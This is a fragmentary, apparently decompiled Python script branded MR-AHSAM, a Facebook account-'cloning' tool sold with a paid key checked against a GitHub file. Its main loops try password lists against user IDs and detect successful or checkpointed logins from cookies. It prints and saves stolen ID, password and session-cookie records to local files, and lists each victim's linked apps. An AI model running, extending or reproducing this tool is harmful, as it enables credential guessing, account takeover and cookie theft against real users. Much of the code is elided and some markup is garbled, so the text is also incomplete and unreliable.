...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mMR-AHSAM]')
...
def uaku():
	try:
		...
		a = requests.get('https://raw.githubusercontent.com/MR-AUH404/FILE/main/Approved.txt').text
...
def notice():
	...
	print('\x1b[0;92mADMIN WHATSAPP\x1aMR_AHSAM')
	time.sleep(2)
	os.system('am start https://wa.me/+92411471937')
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/MR-AUH404/FILE/main/Approved.txt').text
			if basesplit in plr:
				key = basesplit
				stat = '\x1b[0;92mPAID'
				FY = '\x1b[0;93m'
		...
		if _____cowok__pink_____ in ('1',):
			if basesplit in plr:
				...
				os.system('am start https://wa.me/+923411471937')
			elif basesplit in ('3',):
				print('=>EXIT DONE ')
				exit()
			else:
...
def setting():
	...
	banner()
	print('')
	cetak(nel('[ahsam green]➣1. CLONE JUST OLD IDZ \n➣2. CLONE JUST NEW IDZ=>RECOMEND \n➣3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [ahsam green]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ('1', '01'):
	...
	banner()
	print('')
	cetak(nel('[ahsam green]➣1. MOBILE \x1b[1;91m[SLOW]\n➣2. MBASIC \x1b[1;92m[VERY FIRST]\n➣3. TOUCH \x1b[1;91m [SLOW]\n➣4. MTOUCH \x1b[1;91m[SLOW] [ahsam green]'))
	print('')
	hc = input('>> CHOOSE : ')
	if hc in ('1', '01'):
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mAUH_CP🥀')
				...
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mAUH_OK💚')
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mAhsam_CP🥀')
				print(f"\x1b[1;91m[✓] USER ID	   : {idf}\n\x1b[1;91m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				...
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mAhsam_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('Ahsam_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {
				...
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('/sdcard/MR-AHSAM/OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, 'MR-AHSAM  OK', **('title',)))
					ok += 1
					...
					for muncul in apkaktif:
						...
						nok += 1
					hit = 0
					infoakun += '\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/ahsam yellow]\n'
					...
					print('\n')
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/ahsam green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]Ahsam_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys() or 'ya' in oprek:
				...
				if 'ya' in princp:
					...
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'Ahsam_CP', **('title',)))
					open('Ahsam_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('Ahsam_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					...
					for muncul in apkaktif:
						...
						nok += 1
					hit = 0
					infoakun += '\n[ahsam yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n'
					apkexp = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek2))
					hit = 0
					for muncul in apkexp:
						hit += 1
						infoakun += f'''[ahsam yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n'''
					print('\n')
					statusok = f'''[ahsam green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/ahsam green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]Ahsam_OK[/ahsam green]', **('title',)))
					ok += 1
				else:
					continue
			else:
